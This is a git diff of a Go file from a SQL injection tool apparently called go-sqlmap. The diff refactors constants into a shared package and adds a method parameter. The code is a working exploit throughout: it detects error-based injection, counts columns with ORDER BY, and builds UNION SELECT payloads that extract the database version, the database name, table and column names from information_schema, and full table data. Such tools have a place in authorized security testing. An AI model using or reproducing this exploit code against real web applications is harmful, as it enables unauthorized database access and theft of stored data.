@@ -2,6 +2,7 @@ package core
 
 import (
 	"bytes"
+	"go-sqlmap/constant"
 	"go-sqlmap/log"
 	"go-sqlmap/util"
 	"math/rand"
@@ -11,45 +12,27 @@ import (
 	"time"
 )
 
-type Pos struct {
-	Key        int
-	StartIndex int
-}
-
-var (
-	suffixList      = []string{"%20", "'", "\"", ")", "')", "\")"}
-	detectedKeyword = "You have an error in your SQL syntax"
-	OrderKeyword    = "Unknown column"
-	annotator       = "--+"
-	space           = "%20"
-)
-
-func DetectSqlInject(url string) string {
-	flag := false
-	var res string
-	for _, v := range suffixList {
+func DetectErrorBasedSqlInject(url string, method string) (bool, string) {
+	for _, v := range constant.SuffixList {
 		innerUrl := url + v
-		code, _, body := util.Request("GET", innerUrl, nil, nil)
+		code, _, body := util.Request(method, innerUrl, nil, nil)
 		if code != -1 {
-			if strings.Contains(string(body), detectedKeyword) {
-				flag = true
-				res = innerUrl
+			if strings.Contains(strings.ToLower(string(body)),
+				strings.ToLower(constant.DetectedKeyword)) {
+				log.Info("detected error based sql injection!")
+				return true, innerUrl
 			}
 		}
 	}
-	if flag {
-		log.Info("detected sql injection!")
-	} else {
-		log.Info("not detected sql injection!")
-		os.Exit(-1)
-	}
-	return res
+	log.Info("not detected error based sql injection!")
+	os.Exit(-1)
+	return false, ""
 }
 
 func GetSuffix(target string) string {
 	payload := "%20AnD%20'SQLMaP'='SQLMaP'%20--+"
 	_, _, defaultBody := util.Request("GET", target, nil, nil)
-	for _, v := range suffixList {
+	for _, v := range constant.SuffixList {
 		_, _, body := util.Request("GET", target+v+payload, nil, nil)
 		if string(defaultBody) == string(body) {
 			return v
@@ -61,10 +44,11 @@ func GetSuffix(target string) string {
 func GetOrderByNum(suffix string, url string) int {
 	order := "order%20by"
 	for i := 1; ; i++ {
-		payload := url + suffix + space + order + space + strconv.Itoa(i) + space + annotator
+		payload := url + suffix + constant.Space + order +
+			constant.Space + strconv.Itoa(i) + constant.Space + constant.Annotator
 		code, _, body := util.Request("GET", payload, nil, nil)
 		if code != -1 {
-			if strings.Contains(string(body), OrderKeyword) {
+			if strings.Contains(string(body), constant.OrderKeyword) {
 				return i
 			}
 		}
@@ -75,7 +59,7 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	url = url + "0"
 	union := "union%20select"
 	unionSql := bytes.Buffer{}
-	unionSql.WriteString(url + suffix + space + union + space)
+	unionSql.WriteString(url + suffix + constant.Space + union + constant.Space)
 	rand.Seed(time.Now().UnixNano())
 	randMap := make(map[int]int)
 	for i := 1; i < key; i++ {
@@ -85,7 +69,7 @@ func GetUnionSelectPos(suffix string, url string, key int) Pos {
 	}
 	r := []rune(unionSql.String())
 	res := string(r[:len(r)-1])
-	unionPayload := res + space + annotator
+	unionPayload := res + constant.Space + constant.Annotator
 	code, _, tempBody := util.Request("GET", unionPayload, nil, nil)
 	if code != -1 {
 	}
@@ -106,13 +90,13 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 	url = url + "0"
 	version := "union%20select"
 	versionSql := bytes.Buffer{}
-	versionSql.WriteString(url + suffix + space + version + space)
+	versionSql.WriteString(url + suffix + constant.Space + version + constant.Space)
 	for i := 1; i < key; i++ {
 		versionSql.WriteString("version(),")
 	}
 	r := []rune(versionSql.String())
 	res := string(r[:len(r)-1])
-	versionPayload := res + space + annotator
+	versionPayload := res + constant.Space + constant.Annotator
 	code, _, tempBody := util.Request("GET", versionPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
@@ -129,13 +113,13 @@ func GetDatabase(pos Pos, suffix string, url string, key int) string {
 	url = url + "0"
 	database := "union%20select"
 	databaseSql := bytes.Buffer{}
-	databaseSql.WriteString(url + suffix + space + database + space)
+	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
 	for i := 1; i < key; i++ {
 		databaseSql.WriteString("database(),")
 	}
 	r := []rune(databaseSql.String())
 	res := string(r[:len(r)-1])
-	databasePayload := res + space + annotator
+	databasePayload := res + constant.Space + constant.Annotator
 	code, _, tempBody := util.Request("GET", databasePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
@@ -152,14 +136,14 @@ func GetAllTables(pos Pos, suffix string, url string, key int) string {
 	url = url + "0"
 	table := "union%20select"
 	tableSql := bytes.Buffer{}
-	tableSql.WriteString(url + suffix + space + table + space)
+	tableSql.WriteString(url + suffix + constant.Space + table + constant.Space)
 	for i := 1; i < key; i++ {
 		tableSql.WriteString("group_concat(table_name),")
 	}
 	r := []rune(tableSql.String())
 	res := string(r[:len(r)-1])
 	fromSql := "from%20information_schema.tables%20where%20table_schema=database()%20"
-	tablePayload := res + space + fromSql + annotator
+	tablePayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", tablePayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
@@ -176,7 +160,7 @@ func GetColumns(pos Pos, suffix string, url string, key int, tableName string) s
 	url = url + "0"
 	column := "union%20select"
 	columnSql := bytes.Buffer{}
-	columnSql.WriteString(url + suffix + space + column + space)
+	columnSql.WriteString(url + suffix + constant.Space + column + constant.Space)
 	for i := 1; i < key; i++ {
 		columnSql.WriteString("group_concat(column_name),")
 	}
@@ -184,7 +168,7 @@ func GetColumns(pos Pos, suffix string, url string, key int, tableName string) s
 	res := string(r[:len(r)-1])
 	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
 		"'%20and%20table_schema=database()%20"
-	columnPayload := res + space + fromSql + annotator
+	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
@@ -201,7 +185,7 @@ func GetData(pos Pos, suffix string, url string, key int, tableName string, colu
 	url = url + "0"
 	data := "union%20select"
 	dataSql := bytes.Buffer{}
-	dataSql.WriteString(url + suffix + space + data + space)
+	dataSql.WriteString(url + suffix + constant.Space + data + constant.Space)
 	for i := 1; i < key; i++ {
 		prefix := "group_concat("
 		for _, v := range columns {
@@ -214,7 +198,7 @@ func GetData(pos Pos, suffix string, url string, key int, tableName string, colu
 	r := []rune(dataSql.String())
 	res := string(r[:len(r)-1])
 	fromSql := "from%20" + tableName
-	columnPayload := res + space + fromSql + annotator
+	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
 	if code != -1 {
 		body := string(tempBody)
